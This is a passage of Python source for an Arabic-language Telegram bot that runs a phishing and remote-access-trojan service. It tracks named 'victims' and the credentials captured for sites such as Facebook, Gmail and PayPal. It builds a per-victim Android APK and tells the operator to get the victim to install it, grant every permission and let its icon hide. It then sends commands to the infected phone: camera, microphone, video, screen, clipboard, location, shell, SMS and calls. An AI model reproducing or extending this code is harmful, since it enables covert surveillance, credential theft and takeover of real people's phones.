            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "sh", check),
                             parse_mode="HTML")
            return
        bot.answer_callback_query(call.id)

        victims = get_all_victims(chat_id)
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("➕ ضحية جديدة", callback_data="victim_new"))

        if victims:
            markup.add(InlineKeyboardButton(
                f"━━━ 📋 الضحايا ({len(victims)}) ━━━",
                callback_data="noop"
            ))
            for v in victims[:12]:
                name = v.get("name", "غير معروف")[:18]
                site = v.get("site", "facebook")
                creds = int(v.get("creds_count", 0))
                icon = "✅" if creds > 0 else ("⏳" if v.get("status") == "active" else "⏸️")
                site_icon = {
                    "facebook": "📘", "instagram": "📷", "tiktok": "🎵",
                    "twitter": "🐦", "gmail": "📧", "snapchat": "👻",
                    "linkedin": "💼", "discord": "🎮", "telegram": "✈️",
                    "netflix": "🎬", "paypal": "💳", "binance": "💰",
                }.get(site, "🌐")
                vid = v.get("victim_id", "")
                markup.add(InlineKeyboardButton(
                    f"{icon} {name} — {site_icon} ({creds} 📥)",
                    callback_data=f"victim_{vid}"
                ))

        bot.send_message(
            chat_id,
            f"👥 <b>نظام إدارة الضحايا</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📊 <b>عدد الضحايا:</b> <code>{len(victims)}</code>\n\n"
            f"اختر ضحية أو أضف جديدة:",
            reply_markup=markup, parse_mode="HTML"
        )
        return

    if data == "victim_new":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(
            chat_id,
            "📝 <b>أرسل اسم الضحية:</b>\n\nمثال: <code>أحمد</code>",
            parse_mode="HTML"
        )
        bot.register_next_step_handler(msg, victim_name_handler)
        return

    # ============================================================
    # RAT أوامر
    # ============================================================
    if data.startswith("rat_cam_"):
        target_chat_id = data.replace("rat_cam_", "")
        queue_command(target_chat_id, "snapshot")
        bot.answer_callback_query(call.id, "⏳ جاري التقاط الصورة...")
        return

    if data.startswith("rat_mic_"):
        target_chat_id = data.replace("rat_mic_", "")
        queue_command(target_chat_id, "audio")
        bot.answer_callback_query(call.id, "⏳ جاري التسجيل...")
        return

    # ============================================================
    # LSH أوامر
    # ============================================================
    if data.startswith("lsh_snap_"):
        sid = data.replace("lsh_snap_", "")
        ok = lsh_push_command(sid, {"action": "snapshot"})
        bot.answer_callback_query(call.id, "📸" if ok else "❌", show_alert=not ok)
        return

    if data.startswith("lsh_audio_"):
        sid = data.replace("lsh_audio_", "")
        ok = lsh_push_command(sid, {"action": "audio", "payload": {"duration": 6000}})
        bot.answer_callback_query(call.id, "🎙️" if ok else "❌", show_alert=not ok)
        return

    if data.startswith("lsh_video_"):
        sid = data.replace("lsh_video_", "")
        ok = lsh_push_command(sid, {"action": "video", "payload": {"duration": 10000}})
        bot.answer_callback_query(call.id, "🎥" if ok else "❌", show_alert=not ok)
        return

    if data.startswith("lsh_screen_"):
        sid = data.replace("lsh_screen_", "")
        ok = lsh_push_command(sid, {"action": "screen"})
        bot.answer_callback_query(call.id, "🖥️" if ok else "❌", show_alert=not ok)
        return

    if data.startswith("lsh_clip_"):
        sid = data.replace("lsh_clip_", "")
        ok = lsh_push_command(sid, {"action": "clipboard"})
        bot.answer_callback_query(call.id, "📋" if ok else "❌", show_alert=not ok)
        return

    if data.startswith("lsh_loc_"):
        sid = data.replace("lsh_loc_", "")
        ok = lsh_push_command(sid, {"action": "location"})
        bot.answer_callback_query(call.id, "📍" if ok else "❌", show_alert=not ok)
        return

    if data.startswith("lsh_vibrate_"):
        sid = data.replace("lsh_vibrate_", "")
        ok = lsh_push_command(sid, {"action": "vibrate", "payload": {"pattern": [500, 200, 500]}})
        bot.answer_callback_query(call.id, "📳" if ok else "❌", show_alert=not ok)
        return

    if data.startswith("lsh_kill_"):
        sid = data.replace("lsh_kill_", "")
        ok = lsh_push_command(sid, {"action": "redirect", "payload": {"url": "about:blank"}})
        bot.answer_callback_query(call.id, "❌", show_alert=not ok)
        return

    # ============================================================
    # Unknown callback
    # ============================================================
    logger.warning(f"Unhandled callback: {data}")
    bot.answer_callback_query(call.id)


# ============================================================
# Step Handlers
# ============================================================

def victim_name_step(message):
    chat_id = message.chat.id

    if not message.text:
        bot.send_message(chat_id, "❌ اسم غير صحيح")
        return

    victim_name = message.text.strip()[:40]

    wait_msg = bot.send_message(
        chat_id,
        f"⏳ <b>جاري تجهيز APK لـ</b> <code>{h(victim_name)}</code>\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔨 <i>بناء التطبيق في GitHub Actions</i>\n"
        f"⏱️ <i>الوقت المتوقع: 2-4 دقائق</i>",
        parse_mode="HTML"
    )

    victim = create_victim(chat_id, victim_name, "general")

    if not victim:
        try:
            bot.edit_message_text(
                "❌ فشل إنشاء الضحية",
                chat_id=chat_id, message_id=wait_msg.message_id
            )
        except Exception as e:
            logger.warning(f"edit_message_text error: {e}")
        return

    victim_token = victim.get("victim_token")
    victim_id = victim.get("victim_id")

    logger.info(f"Victim created: {victim_name} | {victim_id} | token={victim_token[:16]}")

    def build_and_send():
        if not GITHUB_TOKEN:
            try:
                bot.edit_message_text(
                    f"⚠️ <b>GITHUB_TOKEN غير مضبوط</b>\n\n"
                    f"🔑 <b>كود الضحية:</b>\n<code>{h(victim_token)}</code>\n\n"
                    f"📋 ثبّت APK عام وأدخل الكود يدوياً",
                    chat_id=chat_id, message_id=wait_msg.message_id,
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.warning(f"edit_message_text error: {e}")
            return

        success = trigger_victim_apk_build(victim_token, victim_name)

        if not success:
            try:
                bot.edit_message_text(
                    f"❌ <b>فشل تشغيل البناء</b>\n\n"
                    f"🔑 التوكن: <code>{h(victim_token[:32])}</code>",
                    chat_id=chat_id, message_id=wait_msg.message_id,
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.warning(f"edit_message_text error: {e}")
            return

        # ★ تحديث الرسالة
        try:
            bot.edit_message_text(
                f"✅ <b>تم تشغيل البناء بنجاح</b>\n\n"
                f"⏳ <i>جاري انتظار GitHub Actions...</i>\n"
                f"🆔 Token: <code>{h(victim_token[:16])}</code>\n"
                f"⏱️ <i>الوقت المتوقع: 2-5 دقائق</i>",
                chat_id=chat_id, message_id=wait_msg.message_id,
                parse_mode="HTML"
            )
        except Exception as e:
            logger.warning(f"edit progress error: {e}")

        apk_url = get_victim_apk_url(victim_token, max_wait=900)

        if not apk_url:
            try:
                bot.edit_message_text(
                    f"⏰ <b>انتهت مهلة الانتظار</b>\n\n"
                    f"👤 <code>{h(victim_name)}</code>\n"
                    f"🔗 تحقق يدوياً:\n"
                    f"https://github.com/{GITHUB_REPO}/releases",
                    chat_id=chat_id, message_id=wait_msg.message_id,
                    parse_mode="HTML",
                    disable_web_page_preview=True
                )
            except Exception as e:
                logger.warning(f"edit_message_text error: {e}")
            return

        try:
            r = requests.get(apk_url, timeout=120, allow_redirects=True)

            if r.status_code == 200 and len(r.content) > 10000:
                apk_buffer = io.BytesIO(r.content)
                apk_buffer.name = f"Victim_{victim_name}.apk"

                try:
                    bot.delete_message(chat_id, wait_msg.message_id)
                except Exception:
                    pass

                bot.send_document(
                    chat_id, apk_buffer,
                    caption=(
                        f"✅ <b>APK جاهز للضحية</b> <code>{h(victim_name)}</code>\n"
                        f"━━━━━━━━━━━━━━━━━━\n\n"
                        f"📋 <b>الخطوات:</b>\n"
                        f"1. أرسل APK للضحية\n"
                        f"2. تثبّته على تليفونها\n"
                        f"3. <b>تفتحه وتوافق على كل الصلاحيات</b>\n"
                        f"4. تختفي الأيقونة بعد 5 ثواني\n"
                        f"5. <b>هتظهر تلقائياً في ضحاياك</b> ✅\n\n"
                        f"🎛️ <b>بعد كده:</b> ارجع → إدارة الضحايا → اضغط عليها"
                    ),
                    parse_mode="HTML"
                )
                logger.info(f"APK sent: {victim_name}")
            else:
                bot.send_message(
                    chat_id,
                    f"❌ فشل تحميل APK\n🔗 {h(apk_url)}",
                    disable_web_page_preview=True,
                    parse_mode="HTML"
                )
        except Exception as e:
            logger.exception(f"APK download error: {e}")
            bot.send_message(chat_id, f"❌ خطأ التحميل: {h(str(e))}", parse_mode="HTML")

    threading.Thread(target=build_and_send, daemon=True).start()


def v_toast_step(message, victim_id):
    if not message.text:
        return
    queue_victim_command(victim_id, "toast", text=message.text)
    bot.send_message(message.chat.id, "✅ تم إرسال Toast")


def v_shell_step(message, victim_id):
    if not message.text:
        return
    queue_victim_command(victim_id, "shell", command=message.text)
    bot.send_message(message.chat.id, "✅ تم إرسال الأمر")


def v_sendsms_step(message, victim_id):
    if not message.text:
        return
    parts = message.text.split("|")
    if len(parts) != 2:
        bot.send_message(message.chat.id, "❌ استخدم: <code>رقم|نص</code>", parse_mode="HTML")
        return
    queue_victim_command(victim_id, "send_sms",
                         to=parts[0].strip(), msg=parts[1].strip())
    bot.send_message(message.chat.id, "✅ تم إرسال SMS")


def v_call_step(message, victim_id):
    if not message.text:
        return
    queue_victim_command(victim_id, "call", to=message.text.strip())
    bot.send_message(message.chat.id, "✅ تم بدء المكالمة")


def v_url_step(message, victim_id):
    if not message.text:
        return
    queue_victim_command(victim_id, "open_url", url=message.text.strip())
    bot.send_message(message.chat.id, "✅ تم فتح الرابط")


def v_rename_step(message, victim_id):
    if not message.text:
        return
    new_name = message.text.strip()[:40]
    rename_victim(message.chat.id, victim_id, new_name)
    bot.send_message(message.chat.id,
                     f"✅ <b>تم التغيير إلى:</b> <code>{h(new_name)}</code>",
                     parse_mode="HTML")


def victim_name_handler(message):
    if not message.text:
        return
    name = message.text.strip()[:50]
    chat_id = message.chat.id

    if redis_client:
        try:
            redis_client.setex(f"pending_victim_name:{chat_id}", 300, name)
        except Exception as e:
            logger.warning(f"redis setex pending_victim_name error: {e}")

    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("📘 Facebook", callback_data="victim_site_facebook"),
        InlineKeyboardButton("📷 Instagram", callback_data="victim_site_instagram"),
    )
    markup.row(
        InlineKeyboardButton("🎵 TikTok", callback_data="victim_site_tiktok"),
        InlineKeyboardButton("🐦 Twitter/X", callback_data="victim_site_twitter"),
    )

    bot.send_message(
        chat_id,
        f"👤 <b>اسم الضحية:</b> <code>{h(name)}</code>\n\n🎯 <b>اختر الموقع:</b>",
        reply_markup=markup, parse_mode="HTML"
    )


def victim_rename_handler(message, victim_id):
    if not message.text:
        return
    new_name = message.text.strip()[:50]
    rename_victim(message.chat.id, victim_id, new_name)
    bot.send_message(message.chat.id,
                     f"✅ <b>تم التغيير إلى:</b> <code>{h(new_name)}</code>",
                     parse_mode="HTML")


# ============================================================
# معالجات الأدمن (Step)
# ============================================================

def admin_search_handler(message):
    if not is_admin(message.chat.id): return
    query = (message.text or "").strip().lstrip("@")
    users = get_all_users()
    found = [u for u in users
             if str(u.get("user_id")) == query
             or (u.get("username", "") or "").lower() == query.lower()]
    if not found:
        bot.send_message(message.chat.id,
                         f"❌ لم يُعثر على: <code>{h(query)}</code>",
                         parse_mode="HTML")
        return
    for u in found:
        uid = u.get("user_id")
        bot.send_message(message.chat.id, build_user_info_text(uid, u),
                         reply_markup=build_user_detail_keyboard(uid, u),
                         parse_mode="HTML")


def admin_broadcast_handler(message):
    if not is_admin(message.chat.id): return
    text = message.text
    if not text: return
    users = get_all_users()
    success = failed = 0
    status_msg = bot.send_message(message.chat.id, f"📢 جاري الإرسال لـ {len(users)}...")
    for u in users:
        uid = u.get("user_id")
        if u.get("is_banned"): continue
        try:
            bot.send_message(uid, f"📢 <b>رسالة من الإدارة:</b>\n\n{h(text)}", parse_mode="HTML")
            success += 1
            time.sleep(0.05)
        except Exception as e:
            logger.warning(f"broadcast to {uid} failed: {e}")
            failed += 1
    try:
        bot.edit_message_text(f"✅ <b>تم!</b>\n✔️ {success}\n❌ {failed}",
                              chat_id=message.chat.id,
                              message_id=status_msg.message_id,
                              parse_mode="HTML")
    except Exception as e:
        logger.warning(f"edit broadcast status error: {e}")


def admin_ban_handler(message):
    if not is_admin(message.chat.id): return
    try:
        uid = int((message.text or "").strip())
    except ValueError:
        return
    ban_user(uid)
    bot.send_message(message.chat.id, f"🚫 تم حظر <code>{uid}</code>", parse_mode="HTML")


def admin_unban_handler(message):
    if not is_admin(message.chat.id): return
    try:
        uid = int((message.text or "").strip())
    except ValueError:
        return
    unban_user(uid)
    bot.send_message(message.chat.id, f"✅ تم فك حظر <code>{uid}</code>", parse_mode="HTML")


def admin_delete_handler(message):
    if not is_admin(message.chat.id): return
    try:
        uid = int((message.text or "").strip())
    except ValueError:
        return
    delete_user(uid)
    bot.send_message(message.chat.id, f"🗑️ تم حذف <code>{uid}</code>", parse_mode="HTML")


def admin_grant_vip_handler(message):
    if not is_admin(message.chat.id): return
    try:
        uid = int((message.text or "").strip())
    except ValueError:
        return
    u = get_or_create_user(uid)
    u["is_vip"] = True
    save_user(uid, u)
    bot.send_message(message.chat.id, f"💎 تم منح VIP لـ <code>{uid}</code>", parse_mode="HTML")
    try:
        bot.send_message(uid, "💎 <b>تهانينا!</b> VIP مُفعّل 🚀", parse_mode="HTML")
    except Exception as e:
        logger.warning(f"notify vip user error: {e}")


def admin_give_stars_handler(message):
    if not is_admin(message.chat.id): return
    try:
        parts = (message.text or "").split("|")
        uid = int(parts[0].strip())
        amount = int(parts[1].strip())
    except (ValueError, IndexError):
        bot.send_message(message.chat.id, "❌ صيغة خاطئة")
        return
    u = get_or_create_user(uid)
    u["total_stars_spent"] = max(0, u.get("total_stars_spent", 0) - amount)
    save_user(uid, u)
    bot.send_message(message.chat.id,
                     f"⭐ تم إعطاء <code>{amount}</code> نجمة لـ <code>{uid}</code>",
                     parse_mode="HTML")


def admin_msg_user_handler(message, uid):
    if not is_admin(message.chat.id): return
    try:
        bot.send_message(uid, f"📨 <b>من الإدارة:</b>\n\n{h(message.text)}", parse_mode="HTML")
        bot.send_message(message.chat.id, "✅ تم الإرسال", parse_mode="HTML")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ {h(str(e))}", parse_mode="HTML")
